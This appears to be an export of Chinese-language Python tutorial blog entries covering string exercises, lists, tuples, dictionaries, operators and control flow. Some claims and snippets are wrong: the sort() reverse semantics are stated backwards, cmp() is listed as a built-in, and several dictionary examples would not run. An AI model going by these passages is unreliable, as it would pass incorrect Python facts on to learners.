r&apos;[?|&amp;]&apos; url = &apos;http://www.baidu.com?a=xxx&amp;b=yyyy&apos; result = re.split(pattern, url) print(result) 输出 [&apos;http://www.baidu.com&apos;, &apos;a=xxx&apos;, &apos;b=yyyy&apos;] 4、牛刀小试4.1、按要求输出字符串已知字符串word=”aS98hdkHFSWEas754”,.编写一- 个程序，分别实现如下功能:●请将word字符串中的大写字母改为小写字母，小写字母改为大写字母，●请将word字符串中的数字取出，并输出成一 一个新的字符串 普通版： word = &quot;aS98hdkHFSWEas754&quot; a = &quot;&quot; b = &quot;&quot; for i in word: if 97 &lt;= ord(i) &lt;= 122: # 小写字母变大写 a = a + i.upper() elif 65 &lt;= ord(i) &lt;= 90: # 大写字母变小写 a = a + i.lower() else: a = a + i # 数字不变 b = b + i # 数字取出，组成新的字符串 word = a print(word) print(b) 升级版： word = &quot;aS98hdkHFSWEas754&quot; word = word.swapcase() # word字符串中的大写字母改为小写字母，小写字母改为大写字母 b = &quot;&quot; for i in word: if &apos;0&apos;&lt;=i &lt;=&apos;9&apos;: b = b + i # 数字取出，组成一个新的字符串 print(word) print(b) 4.2、输出生日信息张三的身份证号码是“210011196809210451”.请提取张三的生日信息并输出。 前置知识，身份证的第七位到第14位是出生日期，11位到14位是生日 number = &quot;210011196809210451&quot; birthday = &apos;张三的生日为：{:s}月{:s}日&apos; # 定义模块化字符串 print(birthday.format(number[10:12], number[12:14])) # 使用format方法输出张三生日 4.3、不重复字母已知字符串word=”ABDPISDNGDA”.请去除word字符串多次出现的字母，仅留最先出现的一个。例如aabc经过去除后，输出abc。 b =&quot;&quot; word=&quot;ABDPISDNGDA&quot; for i in word: if i not in b: b += i print(b) 4.4、英文句子倒叙输出将一句英文句于单词顺序留序输出，但是不改变单词结构。例如: 1 am a beautiful ginl,输出为girl beautiful a am I a = input(&quot;请输入英文句子：&quot;) b = a.split() # 将字符串按空格分开，生产一个列表 c = &quot;&quot; for index, item in enumerate(b): # 利用索引倒叙输出列表的值，并拼接为字符串 c = c + b[-1 - index] + &quot; &quot; print(c) 输出 请输入英文句子：You are a beautiful girl girl beautiful a are You]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python知识整合（序列）]]></title>
    <url>%2F2019%2F09%2F12%2Fpython%E7%9F%A5%E8%AF%86%E6%95%B4%E5%90%88%EF%BC%88%E5%BA%8F%E5%88%97%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1、序列序列就是用于存放多个值的连续的空间，且具有顺序关系。python中序列结构主要包括列表、元素、集合和字典。 1.1索引（indexing）索引是从0开始计算在python中索引也可以是负数，从右向左计数，最右边的数是的索引为-1（也就是最后一个数的下标可以是-1）.如 a = [&quot;你&quot;,&quot;好&quot;,&quot;啊&quot;,&quot;吗&quot;] print( a[0] ) print(a[-4]) print(&quot;--------分割线--------&quot;) print(a[1]) print(a[-3]) print(&quot;--------分割线--------&quot;) print(a[2]) print(a[-2]) print(&quot;--------分割线--------&quot;) print(a[3]) print(a[-1]) 输出 你 你 --------分割线-------- 好 好 --------分割线-------- 啊 啊 --------分割线-------- 吗 吗 1.2、切片（Slicing）切片操作是访问序列中的元素的另一种方法语法格式： sname[start : end : step] 说明：1、sname:序列的名字2、start:切片的起始位置（包括该位置），如果不指定，默认为03、end：切片的截止位置（不包括该位置），如果不知道，默认为序列的长度4、step: 切片的步长，如果省略（省略时可以连最后一个冒号也一起省略），默认为1。 如： animal = [&quot;小马&quot;, &quot;小牛&quot;, &quot;小羊&quot;, &quot;小狗&quot;, &quot;小猴&quot;, &quot;小猫&quot;, &quot;小蛇&quot;, &quot;小虎&quot;, &quot;小兔&quot;] print(animal[1:5]) print(animal[2:5:2]) 输出 [&apos;小牛&apos;, &apos;小羊&apos;, &apos;小狗&apos;, &apos;小猴&apos;] [&apos;小羊&apos;, &apos;小猴&apos;] 技巧：如果需要复制一整个序列，可以将start,end都有省略，但是中间的冒号要保留。如 animal[ : ] 1.3、序列相加与相乘1、序列相加可以将2个同类型（同为列表、元组、字典等，序列里的元素类型可以不同）的序列进行相加操作（使用+号进行），其实就是拼接2个序列 2、序列相乘一个序列乘以数字n，那么就将序列重复n次成为新的序列。如 animal = [&quot;小马&quot;, &quot;小牛&quot;, &quot;小羊&quot;] print(animal * 3) 输出 [&apos;小马&apos;, &apos;小牛&apos;, &apos;小羊&apos;, &apos;小马&apos;, &apos;小牛&apos;, &apos;小羊&apos;, &apos;小马&apos;, &apos;小牛&apos;, &apos;小羊&apos;] 如果只是为了初始化指定列表长度的功能，那么可以采取以下方式如 a = [None] * 5 print(a) 输出 [None, None, None, None, None] 1.4、检查某个元素是否是序列的成员（元素）可以使用in关键字来检查语法格式: value in sequence 例子 animal = [&quot;小马&quot;, &quot;小牛&quot;, &quot;小羊&quot;] print(&quot;小马&quot; in animal) print(&quot;xiaoma&quot; in animal) print(&quot;xiaoma&quot; not in animal) 输出 True False True 1.5、计算序列的长度、最大值和最小值计算序列的长度使用内置函数len()、最大值使用内置函数max()和最小值使用内置函数min()如： a = [&quot;1&quot;, &quot;5&quot;, &quot;2&quot;] print(&quot;a序列的长度&quot;, len(a)) print(&quot;a序列的最大元素&quot;, max(a)) print(&quot;a序列的最小元素&quot;, min(a)) 输出 a序列的长度 3 a序列的最大元素 5 a序列的最小元素 1 python中的其他内置函数及其作用 函数 作用 list() 将序列转化为列表 str 将序列转化为字符串 sum() 计算元素和 sorted 对元素进行排序 reversed() 反向序列元素 enumerate() 将序列组合为一个索引序列，多用在for循环中 如 a = [&quot;1&quot;, &quot;5&quot;, &quot;2&quot;] print(&quot;[1,2,3]序列的元素和&quot;, sum([1,2,3])) print(&quot;正序&quot;, sorted(a, reverse=True)) print(&quot;逆序&quot;, sorted(a, reverse=False)) 2、列表（list）python中的列表是非常灵活的，列表里的元素内容可以不同，因为他们之间没有任何关系，但是通常情况下我们在一个列表里只放一种数据类型，为得是增加数据的可读性 2.1、创建与删除列表1、使用赋值运算符直接创建列表语法格式如下： listname = [element 1, element 2, ......, element n] 2、创建空列表语法如下： emptylist = [] 3、创建数值列表可以使用list()函数直接将range()函数循环出口的结果直接转换为列表语法如下：（其中data的类型可以是range对象、字符串、元组或者其他可以迭代类型的数据） list(data) 例子： print(list(range(10))) 输出 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 4、删除列表语法格式： del listname 值得注意的是在python中有自带的垃圾回收机制会自动销毁不用的列表，故该语句我们比较少用。 2.2、访问列表元素输出列表或者列表的某个元素的语法格式： print(listname)或者print(listname[n]) 2.3、遍历列表遍历列表的方法很多，这边介绍2种最常用的 1、使用for循环语法格式： for item in listname: # 输出item 例子： fruit = [&apos;apple&apos;, &apos;banana&apos;, &apos;orange&apos;, &apos;pear&apos;, &apos;watermelon&apos;] for i in fruit: print(i) 输出 apple banana orange pear watermelon 2、使用for循环和enumerate()函数实现使用for循环和enumerate()函数实现输出索引和元素语法格式： for index, item in enumerate(listname): 例子 fruit = [&apos;apple&apos;, &apos;banana&apos;, &apos;orange&apos;, &apos;pear&apos;, &apos;watermelon&apos;] for index,i in enumerate(fruit): print(index, i) 输出 0 apple 1 banana 2 orange 3 pear 4 watermelon 2.4、添加、删除、修改列表元素1、添加元素语法格式如下： listname.append(obj) #速度快，常用 或者 使用+号， #速度太慢 或者 insert()函数 #效率低，不推荐 例子： fruit = [&apos;apple&apos;, &apos;banana&apos;, &apos;orange&apos;, &apos;pear&apos;, &apos;watermelon&apos;] print(&quot;水果的种类有&quot; + str(len(fruit)) + &apos;种&apos;) fruit.append(&quot;grape&quot;) print(&quot;水果的种类有&quot;+ str(len(fruit)) + &apos;种&apos;) 输出 水果的种类有5种 水果的种类有6种 如果要将一个列表里的元素全部添加到另一个列表可以使用下面语句： listname.extend(seq) #seq为要添加进去的列表 2、修改元素直接举例子说明 fruit = [&apos;apple&apos;, &apos;banana&apos;, &apos;orange&apos;, &apos;pear&apos;, &apos;watermelon&apos;] print(fruit) fruit[2] = &apos;strawberry&apos; print(fruit) 输出 [&apos;apple&apos;, &apos;banana&apos;, &apos;orange&apos;, &apos;pear&apos;, &apos;watermelon&apos;] [&apos;apple&apos;, &apos;banana&apos;, &apos;strawberry&apos;, &apos;pear&apos;, &apos;watermelon&apos;] 3、删除元素 （1）、根据索引删除 如： fruit = [&apos;apple&apos;, &apos;banana&apos;, &apos;orange&apos;, &apos;pear&apos;, &apos;watermelon&apos;] del fruit[1] print(fruit) 输出 [&apos;apple&apos;, &apos;orange&apos;, &apos;pear&apos;, &apos;watermelon&apos;] （2）、根据元素值删除 如： fruit = [&apos;apple&apos;, &apos;banana&apos;, &apos;orange&apos;, &apos;pear&apos;, &apos;watermelon&apos;] value = &quot;apple&quot; if fruit.count(value) &gt; 0: # 判断元素是否存在防止报错 fruit.remove(value) print(fruit) 输出 [&apos;banana&apos;, &apos;orange&apos;, &apos;pear&apos;, &apos;watermelon&apos;] 2.5、对列表进行统计计算1、获取指定元素出现的次数使用count()函数语法格式： listname.count(obj) 2、获取指定元素首次出现的下标使用index（）函数语法格式： listname.index(obj) 3、统计数值列表的元素和使用sum()函数 sum(iterable[,strart]) #iterable为要统计的列表名 2.6、对列表进行排序1、使用sort函数进行排序语法格式： listname.sort(key=None,reverse=False) 参数说明，key是指定一个比较键，如当key=str.lower时，不区分大小写。reverse=False时为降序，为True时为升序，默认为升序。 注意sort()函数对字符串进行排序时，先对大写字母进行排序，然后对小写字母进行排序。且对中文排序时，容易出错如 fruit = [&apos;Apple&apos;, &apos;banana&apos;, &apos;Orange&apos;, &apos;pear&apos;, &apos;watermelon&apos;] print(&apos;-------区分大小写-------&apos;) fruit.sort() print(fruit) print(&apos;-------不区分大小写-------&apos;) fruit.sort(key=str.lower) print(fruit) 输出——-区分大小写——- [&apos;Apple&apos;, &apos;Orange&apos;, &apos;banana&apos;, &apos;pear&apos;, &apos;watermelon&apos;] -------不区分大小写------- [&apos;Apple&apos;, &apos;banana&apos;, &apos;Orange&apos;, &apos;pear&apos;, &apos;watermelon&apos;] 2、使用sorted()函数进行排序作用与sort()基本一样，但是sorted（）不会改变原列表的顺序，sort（）会。语法格式： sorted(iterable, key=None,reverse=False) #iterable为要排序的列表 如 fruit = [&apos;Apple&apos;, &apos;banana&apos;, &apos;Orange&apos;, &apos;pear&apos;, &apos;watermelon&apos;] fruit_a = sorted(fruit) print(&quot;原列表顺序不变&quot;, fruit) print(fruit_a) 输出 原列表顺序不变 [&apos;Apple&apos;, &apos;banana&apos;, &apos;Orange&apos;, &apos;pear&apos;, &apos;watermelon&apos;] [&apos;Apple&apos;, &apos;Orange&apos;, &apos;banana&apos;, &apos;pear&apos;, &apos;watermelon&apos;] 2.7、列表推导式使用列表推导式可以快速生成一个列表，或让摸个列表生成满足指定需求的列表。有以下几种常用方法1、生成指定范围的数值列表语法格式：list = [Expression for var in range] 参数说明：list生成的列表名，Expression表达式用于计算新列表的元素var循环变量，range采用range()生成的range对象如生产10个随机数，范围在10到100之间 import random randomnumber = [random.randint(10,100) for i in range(10)] print(randomnumber) 输出 [65, 50, 57, 84, 56, 30, 27, 47, 98, 79] 2、根据列表生成指定需求的列表语法格式： newlist = [Expression for var in list] 如 import random price = [100, 200, 300] # 商品价格 sale = [int(i*0.5) for i in price] # 打五折后的价格 print(sale) 输出 [50, 100, 150] 3、从列表中选择符合条件的元素组成新的列表语法格式： newlist = [Expression for var in list if condition] 如 import random price = [100, 200, 300] # 商品价格 sale = [i for i in price if i &gt; 200] # 价格大于200的商品价格 print(sale) 输出 [300] 3、元组元组简单说就是不可变的列表（不可变序），用于保存不可修改的内容。 3.1、元组的创建与删除1、用赋值运算符直接创建元组语法格式（括号可以省略） tuplename = (element 1,element 2,...element n) 如果创建的元组只有一个符号时，需要在元素的后面加个逗号如： a = (&quot;a&quot;,) # 元组 a = (&quot;a&quot;) # 字符串 2、创建空元组语法格式 emptytuple = () 3、创建数值元组语法格式 tuple(data) 如 print(tuple(range(0, 10, 3))) 输出 (0, 3, 6, 9) 4、删除元组语法格式 del tuplename 3.2、访问元组元素print直接打印元组语法格式 print(tuplename) #打印整个元组 print(tuplename[n]) #打印单个元组元素 print(tuplement[x:y]) #打印多个元素 当然也可以使用for循环来遍历，语法格式与列表一样 3.3、修改元组元素修改元组里的单个元素的内容，是不支持的如 a = (1,2,3) a[1]= &quot;a&quot; print(a) 报错 TypeError: &apos;tuple&apos; object does not support item assignment 但是我们可以把一整个元组重新赋值如 a = (&apos;1&apos;, 2, 3) print(a) a = (&apos;1&apos;, 6, 9) print(a) a = a+a print(a) 输出 (&apos;1&apos;, 2, 3) (&apos;1&apos;, 6, 9) (&apos;1&apos;, 6, 9, &apos;1&apos;, 6, 9) 注意进行元组的连接时，连接的内容必须都是元组。连接的元组只有一个元素时，不用忘记元素后面的逗号。 3.4、元组的推导式语法格式与列表类似 例子 import random randomname = (random.randint(10,100) for i in range(5)) print(&quot;生产的元组为&quot;, randomname) 输出 生产的元组为 &lt;generator object &lt;genexpr&gt; at 0x000001C573448E60&gt; 可以发现元组推导式生成的结果是一个生成器对象，而不是元组或者列表。这点与列表不同。其中转化成元组用tuple()函数，转化为列表用list函数 通过for循环遍历，或者使用next()方法可以使用元组推导器生成的生成器对象 如：（next()例子） import random randomname = (i for i in range(3)) print(randomname.__next__()) print(randomname.__next__()) print(randomname.__next__()) print(tuple(randomname)) 输出 0 1 2 () 如（for循环遍历例子） import random randomname = (i for i in range(3)) for i in randomname: print(i, end=&quot; &quot;) print(tuple(randomname)) 输出 0 1 2 () 3.5、元组与列表的区别1、元组不可变序列；列表可变序列 2、元组不能修改、添加，删除单个元素；列表可以 3、元组只支持切片访问，不支持切片修改；列表都支持 4、元组访问和处理速度比列表快。使用当只需要对其中的元素进行访问时，，建议使用元组 5、元组可以作为字典的键；列表不能。 4、字典字典是无序的可变序列。保存内容是以“键—值对”的形式存放，键是唯一的，值可以是多个的。 字典的主要特征：1、通过键来读取而不是索引 2、字典是任意对象的无序集合 3、字典是可变的，并且可以任意嵌套。 4、字典的键必须是唯一和不可变的。 4.1、字典的创建与删除创建字典语法格式 dictionary = {&apos;key1&apos;:&apos;value1&apos;,&apos;key1&apos;:&apos;value1&apos;,...,&apos;keyn&apos;:&apos;valuen&apos;,} 创建空字典的语法 dictionary = {}或者dictionary = dict() 1、通过映射函数创建字典 dicttionary = dict(zip(list1,list2)) #list1作为键的列表 list2作为值的列表 注意如果list1与list2长度不一样，则与最短的列表长度一样 2、通过“键——值对”创建字典 dictionary = dict(key1=value1,key2=value2,...,keyn=value n) 如 a = dict(福州=&apos;3&apos;,) print(a) 输出 {&apos;福州&apos;: &apos;3&apos;} python中还可以使用dict对象的fromkeys()方法创建值为空的字典语法格式： dictionary = dict.fromkeys(list1) #list1为键的列表 当然还有可以通过存在的元组和列表来创建字典（列表不能作为键，字典可以）如 list = [1, 2, 3] b = (&apos;1&apos;, &apos;2&apos;, &apos;3&apos;) c = {b: list} print(c) 输出 {(&apos;1&apos;, &apos;2&apos;, &apos;3&apos;): [1, 2, 3]} 3、删除字典语法格式 del dictionary 4、把字典变为空字典语法格式 dictionary.clear() 当然还有pop(),popitem（）方法。 4.2、通过键—值对访问字典如果想直接输出字典的内容直接printf（dictionary），但是我们一般不这么做。一般是根据指定的键得到我们想要的结果。如 print(dictionary([key]) 但是这样容易出错，我们一般使用以下语句 print(dictionary[key] if &apos;key &apos; in dictionary else &apos;我的字典里没有该内容&apos;) python中推荐使用字典对象的get()方法获取指定的键的值语法格式如下： dictionary.get(key,[default]) 说明defaults是当指定的键不存的时候就返回一个默认值，default可以省略，如果省略返回None 4.3、遍历字典1、通过items()方法遍历语法格式： dictionary.items() #返回可以遍历的j键-值元组列表 2、for循环遍历该元组列表如 dictionary = {&apos;qq&apos;:&apos;12333&apos;} for i in dictionary.items(): print(i) 或 for key,value in dictionary(): print(value) 4.4、添加、修改、删除字典元素1、添加元素语法格式 dictionary[key] = value 注意如果键名之前已经存在，那么将换替换该键的值 2、删除某个元素如： dictionary = dict[key] 或者 if &quot;key&quot; in dictionary: #防止键不存在时报错 dictionary = dict[key] 4.5、字典推导式其表现形式与列表推导式相似，这边不做说明 5、列表、元组、字典的区别 数据结构 是否可变 是否有序 定义符号 列表 可变 有序 [] 元组 不可变 有序 () 字典 可变 无序 {key,value} 题目：创建一个包含1~50之间所有素数的列表，打印显示该列表;随后只保留该列表前5个数字，删除其余内容并打印输出相应结果;再将每个元素值加。上20，显示列表内容。 prime_number = [2] for i in range(3, 51): for j in range(2, i): if i % j != 0: n = i if j == n-1: prime_number.append(i) break else: break print(prime_number) prime_number = prime_number[:5] for k in range(5): prime_number[k] = prime_number[k] + 20 print(prime_number) 6、逻辑判断内置函数 all(iterable) 集合中的元素都为真的时候为真，注意空字串返回为True any(iterable) 集合中的元素有一个为真的时候为真，特别是空串返回False cmp（x,y） x&lt;y，返回负数；x = y,返回0；x&gt;y返回正数]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python知识整合（基础）]]></title>
    <url>%2F2019%2F09%2F12%2Fpython%E7%9F%A5%E8%AF%86%E6%95%B4%E5%90%88%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[本文章内容的python版本默认为python3.x 1、注释注释包括单行注释，多行注释，中文声明注释 1.1、单行注释注释内容从#号到换行为止结束语法格式： # 注释内容 注释格式：第一种 #请输入你的年龄 age=int(input(&quot;请输入你的年龄&quot;)) 第二种 age=int(input(&quot;请输入你的年龄&quot;)) #请输入你的年龄 1.2、多行注释在python中没有一个单独的多行注释标记，而是将注释内容包含在一对(‘’’…..’’’’)或者（”””…”””）语法格式： &apos;&apos;&apos; 注释内容1 注释内容2 ...... &apos;&apos;&apos; 或者 &quot;&quot;&quot; 注释内容1 注释内容2 ...... &quot;&quot;&quot; 当然可以利用单行注释实现多行注释，如 #注释内容1 #注释内容2 #.... 1.3、中文编码声明注释在python编写时，如果要指定字符编码，那么就需要在文件开头加上中文编码声明注释，来指定我们所需要的字符编码类型的中文编码，可以避免输出乱码语法格式： #-*- coding:编码-*- 或者 # coding=编码 如 # coding=utf-8 ==值得注意的是==，上面代码中的-*-是为了美观才加上的，没有任务特殊作用，故也可写为 # coding:编码 2、代码缩进python中使用代码缩进来区分代码的层次感，这点与c等一些语言不一样。 缩进可以使用空格键或者tap键，通常一个缩进量默认为为4个空格（可以修改），一个tap键为4个空格，不过，建议使用空格进行缩进。 注意：python中对代码缩进的要求非常严格，同一个级别的代码块的缩进量必须是相同的，否则将出现语法错误（SyntaxError） 3、代码规范3.1、编写规则pthon采用的是PEP8的编码规范，PEP是python Enhancement Proposal的缩写，8为版本 使用import进行导入模块时，注意，一次只导入一个模块。推荐写法： import os import request 不推荐写法： import os , request 不要在行尾添加“；”，也不用将2条命令放在同一行，然后用“；”隔开。python中换行代表中一个语句的结束。 建议每行不超过80个字，如果超过用（）连接，不推荐”\”如,推荐 print(&quot;是多少级看过的力合股份客户广泛空间看过空间看过很快就卡。&quot; &quot;夫卡的风格看看吃饭大概开发地方&quot;) 不推荐 print(&quot;是多少级看过的力合股份客户广泛空间看过空间看过很快就卡。\ &quot;夫卡的风格看看吃饭大概开发地方&quot;) 特殊情况除外1.导入模块语句过长2.注释里的URL 可以使用空行增加代码的可读性，如·在定义方法之间空一行等等。 3.2.命名规范1、模块名尽量短小，且全部小写，可以使用下划线，如 game_age 2、包名尽量短小，且全部小写，不推荐使用下划线，如 com.book 3、类名采用单词首写字母大即是Pascal风格。如 BorrowBook 4、内部模块采用下划线加Pascal风格命名，如 _BorrowBook 5、函数、类的属性和方法的命令规则和模块类似 6、常量命名时全部大写，使用可以使用下划线 注意：使用单下划线开头的模块变量或函数是受保护的，在使用import*from语句从模块中不能导入。使用双下划线开头的实例变量或方法是类私有的。 4、基本的输入与输出4.1、print（）函数print（）基础语法： print(&quot;输出内容&quot;) 注意print（）语句输出后会自动换行，如果要一次输出多个内容，且不换行，可以用英文的半角逗号进行分开。如 print(&quot;a&quot;,&quot;b&quot;) 输出结果为a b 输出时间如 import datetime # 调用时间模块datetime d=datetime.datetime.now() print(d) # 输出当前日期和时间 print(d.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;)) # 按格式输出当前时间 print(d.strftime(&apos;%I:%M %p&apos;)) print（）不仅仅可以输出内容到屏幕还可以输出到指定文件如 fp = open(r&apos;F:\my.txt&apos;,&apos;a+&apos;) # 打开文件，如果没有该文件将自动创建文件 print(&quot;hello world&quot;,file=fp) # 输出到文件中 fp.close() # 关闭文件 4.2、input（）函数作用：input（）在python中可以用来接收用户键盘输入的内容 如： b = input(&quot;输入字符:&quot;) print(b+&quot;的ASCII码为&quot;,ord(b)) 输出结果为： 输入字符:b # b为我们输入的字符 b的ASCII码为 98 例子：根据输入的年份计算年龄 import datetime # 调入时间模块datetime imyear = input(&quot;请输入你的出生年份&quot;) # 输入四位数的出生年份 nowyear = datetime.datetime.now().year # 获取当前的年份 age = int(nowyear) - int(imyear) # 计算年龄 print(&quot;你的年龄为&quot;+str(age)) 注意判断一个变量的类型可以使用type()函数 例子：查单个字符的ACSII码器 b = 12 while b&gt;0: a = input(&quot;请输入字符：&quot;) print(a + &quot;的ASCII码为&quot;, +ord(a)) 5、保留字与标识符5.1、保留字保留字就是被赋予特定意义的一些单词，这些单词不能被当作变量、函数、类、模块和其他对象的名称来使用（否则会报invalid syntax错误），python中保留字是区分大小写的， python中的保留字，这边全部列出| and | as | assert | break | class || ——– | —— | —— | —– | —— || continue | def | del | elif | except || finally | for | from | False | global || if | import | in | is | lambda || nonlocal | or | pass | raise | return || try | True | while | with | yield | 当然如果我们忘记了也不用紧，可以通过2行代码查看保留字 import keyword print(keyword.kwlist) 5.2、标识符简单说标识符就是一个名字，用来识别变量、函数、类、模块和其他对象的名称。 命名规则1、由字母、下划线和数字组成，并且第一个字母不能是数字。目前python中只允许使用ISO-Latin字符集中的字符A-Z和a~z.2、不能使用Python中的保留字例如，合法标识符 USSSS name name123 name_age 不合法标识符 4name # 不能以数字开头 if # 不能以保留字当作标识符 $name # 不能使用特殊字符 空格、$、@、%等 3、区分字母大小写 4、以下划线开头的标识符具有特殊意义，要避免使用类似的标识符 以单下划线开头的标识符表示不能直接访问的类的属性，也不能太过from xxx import *导入 以双下划线开头的标识符表示类的私有成员 以双下划线开头和结尾的标识符是python中专用的标识，如int（）表示构造函数 5、尽量避免使用汉字作为标识符，尽管这是被允许的。 6、变量6.1、变量的命名规则与语法格式变量的命名规则 1、变量名必须是一个有效的标识符 2、变量名不能使用python中的保留字 3、慎用小写字母 l 和大写字母O 4、应该选择有意义的单词作为变量名 语法格式 变量名 = value #变量赋值 如 name = 12 # 创建变量name并赋值为12，类型为int name = &quot;John&quot; # 创建变量name并赋值为John，类型为str 注意，python中允许多个变量指向同一个值，但是他们对于的内存地址是否相同呢同，我们可以是内置函数id()来查看 例如 a = 2014 b = 2014 print(&quot;a的地址为&quot;,+id(a)) print(&quot;b的地址为&quot;,+id(b)) 输出 a的地址为 2316677533424 b的地址为 2316677533424 7、基本数据类型7.1、数字类型1、整数整数包括，十进制、八进制、十六进制 十进制不能以0开头 八进制在python3.x中必须以0o或0O开头，python2.x可以以0开头 十六进制必须以0x或0X开头 2、浮点数浮点数表现形式，如2.7e2(科学计数法)，1.1414 值得注意的是在使用浮点数进行计算时，可能会出现小数位数不确定的情况，如 a = 0.2 b = 0.1 c= a + b print(c) 我们觉得输出0.3，但是实际输出0.30000000000000004，所有语言都有这个问题，可以忽略对于的小数位 3、复数在python中复数与数学中的复数在形式上完全一样 7.2、字符串类型在python中字符串属于不可变序列通常用单引号，双引号，三引号括起来。其中三引号内的字符序列可以分布在连续的多行中，而单引号，双引号内的字符序列必须在一行中。 注意如果需要表示复杂的字符串时可以进行引号的嵌套如; print(&apos;&apos;&apos;&apos;___&apos; &quot;_&quot;***&apos;&apos;&apos;) 输出 &apos;___&apos; &quot;_&quot;*** python中的字符串还支持转义字符常见的转义字符如下表| \ | 续行符 || —- | ———————————— || \n | 换行符 || \r | 回车符 || \0 | 空 || \t | 水平制表，用于横向跳到下一制表位 || \ “ | 双引号 || \ ‘ | 单引号 || \ | 一个反斜杠 || \f | 换页 || \0dd | 八进制数，dd表示字符，如\012代表换行 || \xhh | 十六进制，hh表示字符，如\x0a代表换行 | 注意在字符串定界符引号的前面加上R或r，将无视转义字符的存在。如 print(r&quot;hello\nworld&quot;) print(&quot;hello\nworld&quot;) 输出 hello\nworld hello world 7.3、布尔类型标识符True和False为布尔类型True表示1，False表示0 注意布尔类型可以进行运算但是不建议进行运算 在python中所有对象都可以进行真假测试，只有以下几种情况为假其他都为真。1、False或None 2、数值中的零，包括0、0.0、序数0 3、空序列，包括字符串，空元组、空列表、空字典 4、自定义对象的实例，对象的bool方法返回False或者len方法返回0. 7.4、数据类型转换python是动态类型语言（也就是弱类型语言），不需要先声明变量类型，但在对变量进行操作时可能用到类型转换。 常用的类型转换函数| 函数 | 作用 || ——————– | ————————————————– || int(x) | 将x转为整型 || float（x） | 将x转为浮点型 || complex(real[,imag]) | 创建一个复数 || str(x) | 将x转为字符串 || repr(x) | 将x转为表达式字符型 || eval(str) | 计算在字符串中的有效的python表达式，并返回一个对象 || chr(x) | 将整数x转为字符 || ord(x) | 将一个字符返回其所对应的整数值 || hex(x) | 将一个整数转化为一个16进制字符串 || oct(x) | 将一个整数转化为一个8进制字符串 | 8、运算符8.1、算术运算符加（+）、减（-）、乘（*）、除（/）、取余数（%）、取整除（//）、幂（**） 注意1、在%中如果除数（第二个操作数）是负数，那么得到的结果也是负数 2、使用/或//时，除数不能为0，不然会出现错误 3、在python2.x中/符号计算的结果为整数，而在python3.x中为浮点数，如3/2，在python2.x中为1，在在python3.x中为1.5 8.2、赋值运算符常见的赋值运算符有=、+=、-=、*=、/=、%=、**=、//=等在使用时，就是把=号右边的值赋值给左边的变量，也可以进行某些运算后再赋值给左边的变量。如x-=y,就是等于x=x-y,例子如下 x = 1 y = 2 x -= y print(x) 输出x=-1 8.3、比较（关系运算符）对表达式或者变量的结果进行大小、真假等比较，如果比较结果为真返回True,否则为False 比较运算符有： &gt;、 &lt; 、==、!=、&gt;=、&lt;= 如果要判断一个变量是否在一个范围内可以使用 “ 值1&lt;变量a&lt;值2 ” 8.4、逻辑运算符主要包括 and（逻辑与） or（逻辑或） not（逻辑非）and和or 的结合方向是从左到右not的不一样是从右到左 8.5、位运算符位运算符是对二进制进行计算的，所以需要把要执行的数据转化为二进制数，然后再进行位操作。python中位运算符有位与（&amp;）、位或（|）、位异或（^）、位取反（~）、位左移（&lt;&lt;）、位右移（&gt;&gt;）， 位运算符名称 算法 位与（&amp;） 2个二进制数的对位都为1时才为1，否则为0 ，若2个操作数精度不同，则结果的精度与精度高的操作数相同 位或 2个二进制数的对位都为0时才为0，否则为1，若2个操作数精度不同，则结果的精度与精度高的操作数相同 位异或（^） 2个二进制数的对位相同时才为0，否则为1 ，若2个操作数精度不同，则结果的精度与精度高的操作数相同 位取反（~） 操作数中的1改为0,0改为1 位左移（&lt;&lt;） 将一个二进制操作数左移指定的位数，左边（高位段）溢出的位丢低，右边（低位段）的空位用0补充，位左移运算相当于乘以2的n次幂 右移（&gt;&gt;） 将一个二进制操作数右移指定的位数，右边（低位段）溢出的位用丢低，而在左边（高位段）的空位补充时，如果最高位为0，则在左侧补0，否则补1。位右移运算相当于除以2的n次幂 注意：由于移位运算符运算速度很快，所有在程序中遇到表达式乘以或除以2的n次幂时可以用移位运算符来代替 8.6、运算符的优先级python中运算符的运算规则是，优先级高的先执行，低的后执行，同一级的按从左往右进行操作。当然如果有括号，括号内的运算最先执行。在编写程序时尽量使用括号（）来限定运算次序，以免运算次序出错运算符的优先级（从高到低）| 类型 || ———————————- || * || ~、+、- || 、/、%、// || +、- || &lt;&lt;、&gt;&gt; || ^ || 位或 || &lt;、&lt;=、&gt;&gt;、=!、=、==（比较运算符） | 9、流程控制语句9.1、选择语句1、最简单的if语句语法结构如下： if 表达式： 语句块 注意在python中，当表达式的值为非零或者非空的字符串时。if语句也认为是条件成立（为真值）2、if…else语句语法结构如下： if 表达式： 语句块1 else: 语句块2 技巧：if…else语句可以使用条件语句进行简化，如 a = 1 if a &gt; 0: b =a else: b = -a print(b) 可以简化为（就是使用条件表达式） a = 1 b = a if a &gt; 0 else -a print(b) 3、if…elif…else语句语法结构 if 表达式1： 语句块1 elif 表达式2： 语句块2 elif 表达式3： 语句块3 ... else: 语句块n 注意:if与elif都需要进行判断真假，而else不需要判断；else和elif都需要与if一起使用，不能单独使用 4、if语句的嵌套if选择语句可以有多种嵌套方式，根据需要灵活运用。如 if 表达式1： if 表达式2： 语句块1 else: 语句块2 9.2、循环语句循环体就是一组被重复执行的语句。1、whie循环while循环结构 while 条件表达式： 循环体 值得注意的是Python不支持do〜while语法、while（无限循环）和break组合起来替换 do ~ while如 n = 0 while True: #无限循环... print n n += 1 if n == 10: break #结束循环 2、for循环for循环结构 for 迭代变量 in 对象： 循环体 如： print(&quot;技术1+2+3+...+100结果为：&quot;) result = 0 for i in range(101): result += i print(result) 对range()这个函数进行简单的说明 range(start,end,step) start为计数的起始值，可以省略，省略就从0开始 end为计数的结束值，但是不包括该值，如range(5),会输出0,1,2,3,4，不可省略 step为计数的步长，就是2个参数之间的间隔，可以省略，省略就默认为1 小技巧在python3.x中，如果让print语句输出的内容在一行上可以使用下面这个语句 print(result,end=&apos; 分隔符 &apos;) for语句不仅可以循环数值，还可以逐个遍历字符串。 当然可以进行循环嵌套 9.3、跳转语句和pass空语句1.break语句break语句通常会结合if语句使用，在某种条件下跳出循环。如果是嵌套循环，那么break语句将跳出最内层的循环 